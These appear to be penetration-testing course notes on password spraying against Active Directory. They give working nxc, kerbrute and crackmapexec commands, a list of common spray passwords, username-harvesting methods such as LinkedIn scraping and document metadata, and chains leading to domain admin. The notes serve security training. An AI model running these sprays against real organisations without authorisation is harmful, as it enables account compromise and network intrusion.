# Section 08 — Password Spraying Overview

> No lab questions. Concepts + workflow reference.

---

## QUICK REFERENCE — Spray Workflow

```bash
# 1. Get password policy FIRST (section 09)
nxc smb DC_IP -u USER -p PASS --pass-pol

# 2. Build user list (section 10)
kerbrute userenum -d DOMAIN --dc DC_IP wordlist.txt -o valid_users.txt

# 3. Spray — ONE password at a time
crackmapexec smb DC_IP -u valid_users.txt -p 'Welcome1' | grep +

# 4. Wait (lockout duration + 1 min) before next round

# 5. Validate hits
nxc smb DC_IP -u HIT_USER -p 'Welcome1'
```
> `--pass-pol` pulls the password policy so you know the lockout threshold. `kerbrute userenum` finds valid usernames without lockouts. `crackmapexec smb` with `| grep +` filters output to successful logins only. Always validate a hit before using those creds further.

---

## Spray vs Brute Force

| | Password Spray | Brute Force |
|-|---------------|-------------|
| Passwords per user | 1 (or very few) | Many |
| Lockout risk | Low if controlled | High |
| Use case | Initial foothold | Known weak policy target |

---

## Lockout Rules — Never Skip This

**Know the policy before you spray.** Locking out production accounts is a major incident.

```
Threshold = 5  → spray max 3 passwords before waiting
Duration  = 30 → wait 31 min between rounds
Unknown policy → max 1-2 attempts total, wait 1+ hour between
```

Safe formula: `threshold - 2 = max attempts per round`

Password spraying uses one password against many accounts. Brute force tries many passwords against one account. Spraying stays under the lockout threshold because each account only sees one attempt per round.

---

## Common Spray Passwords

```
Welcome1       Welcome1!      Password1      Password123
Winter2025     Spring2025     Summer2025     Fall2025
Company@123    CompanyName1   [company name + year]
```

---

## Building a Username List

```bash
# Kerbrute enumeration
kerbrute userenum -d DOMAIN --dc DC_IP /opt/jsmith.txt -o valid_users.txt

# LinkedIn scraping
python3 linkedin2username.py -u EMAIL -p PASS -c "Company Name"

# Document metadata (reveals AD username format)
exiftool document.pdf     # check Author field
```
> Three ways to build a username list without credentials. Kerbrute is stealthy. LinkedIn2username generates permutations from employee names (e.g. `first.last`, `flast`). `exiftool` reads the Author field from PDFs and Office docs — that field often contains an AD username.

---

## Real-World Attack Chains

### Chain 1 — Spray → BloodHound → DA
```
Kerbrute + LinkedIn → user list → spray Welcome1 → 2 hits →
BloodHound with creds → attack path → domain compromise
```

### Chain 2 — Metadata → All Accounts → DA
```
PDF metadata → GUID username format → generate all 1.6M combos →
Kerbrute enum → every domain account → spray → RBCD + Shadow Credentials → DA
```

---

## Exam Notes

- One password, many users — never the reverse
- Password policy first, every time — no exceptions
- Even 2 low-priv hits from spraying is enough to run BloodHound
- Spray hits → immediately test against SMB, RDP, WinRM, OWA, VPN, Citrix
